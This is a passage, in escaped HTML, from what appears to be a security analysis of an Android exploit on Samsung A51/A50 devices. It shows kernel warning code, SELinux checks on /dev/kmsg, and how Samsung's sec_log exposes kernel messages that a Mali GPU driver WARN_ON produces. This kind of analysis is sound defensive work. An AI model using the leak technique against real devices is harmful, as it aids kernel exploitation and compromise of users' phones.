class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; print_modules&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; dump_stack&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; print_oops_end_marker&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;/* Just a warning, don&amp;#39;t kill lockdep. */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; add_taint&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;taint&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;LOCKDEP_STILL_OK&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c2 vdnyYxSRCi-c33 vdnyYxSRCi-c44\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;On Android, the ability to read from &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;kmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;is scoped to privileged users and contexts. &lt;/span&gt;&lt;span&gt;While &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;kmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;is readable by &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;system_server&lt;/span&gt;&lt;span&gt;, it is not readable from the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;system_app&lt;/span&gt;&lt;span&gt;&amp;nbsp;context, which means it&amp;rsquo;s not readable by the e&lt;/span&gt;&lt;span&gt;xploit.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.1187718de85bb2eac5503bd22ce0d6a9ea90e292\"&gt;&lt;/a&gt;&lt;a id=\"t.6\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;a51&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;/ $ ls -alZ /&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;dev&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;kmsg&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;crw&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;rw&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;----&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;1&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;root system u&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;object_r&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kmsg_device&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;s0 &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;1&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;11&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;2022&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;10&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;27&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;21&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;48&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;dev&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;/&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;kmsg&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;$ sesearch &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;A &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;s system_server &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;t kmsg_device &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;p read precompiled_sepolicy&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow domain dev_type&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;lnk_file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;getattr ioctl &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;lock&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;map open read &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow system_server kmsg_device&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;chr_file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;append getattr ioctl &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;lock&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;map open read write &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;Samsung however has added a custom logging feature that copies &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;kmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;to the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;sec_log&lt;/span&gt;&lt;span&gt;. The &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;sec_log&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a file found at &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;/data/log/sec_log.log&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;WARN_ON&lt;/span&gt;&lt;span&gt;&amp;nbsp;that the exploit triggers is in the Mali GPU graphics driver provided by ARM. ARM replaced the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;WARN_ON&lt;/span&gt;&lt;span&gt;&amp;nbsp;with a call to the more appropriate helper &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;pr_warn&lt;/span&gt;&lt;span&gt;&amp;nbsp;in &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c24\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://developer.arm.com/downloads/-/mali-drivers/bifrost-kernel\"&gt;release BX304L01B-SW-99002-r21p0-01rel1 in February 2020&lt;/a&gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;. However, the A51 (SM-A515F) and A50 (SM-A505F) &amp;nbsp;still used a vulnerable version of the driver (r19p0) as of January 2021. &amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.f06791a45fc9ef7d932e2432c73114a95e71a32c\"&gt;&lt;/a&gt;&lt;a id=\"t.7\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;/**&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp;* kbasep_vinstr_hwcnt_reader_ioctl() - hwcnt reader&amp;#39;s ioctl.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp;* @filp: &amp;nbsp; Non-NULL pointer to file structure.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp;* @cmd: &amp;nbsp; &amp;nbsp;User command.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp;* @arg: &amp;nbsp; &amp;nbsp;Command&amp;#39;s argument.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp;*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp;* Return: 0 on success, else error code.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;static&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;long&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;kbasep_vinstr_hwcnt_reader_ioctl&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;filp&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;unsigned&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;int&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;cmd&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;unsigned&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;long&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;arg&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;long&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;rcode&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;kbase_vinstr_client &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;cli&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(!&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;filp &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;||&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;_IOC_TYPE&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;cmd&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;!=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;KBASE_HWCNT_READER&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;))&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;return&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;EINVAL&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; cli &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;filp&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;private_data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(!&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;cli&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;return&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;EINVAL&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;switch&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;cmd&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;case&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;KBASE_HWCNT_READER_GET_API_VERSION&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; rcode &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;put_user&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;HWCNT_READER_API&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;u32 __user &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;arg&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;break&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;case&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;KBASE_HWCNT_READER_GET_HWVER&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; rcode &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;kbasep_vinstr_hwcnt_reader_ioctl_get_hwver&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; cli&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;u32 __user &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;arg&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;break&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 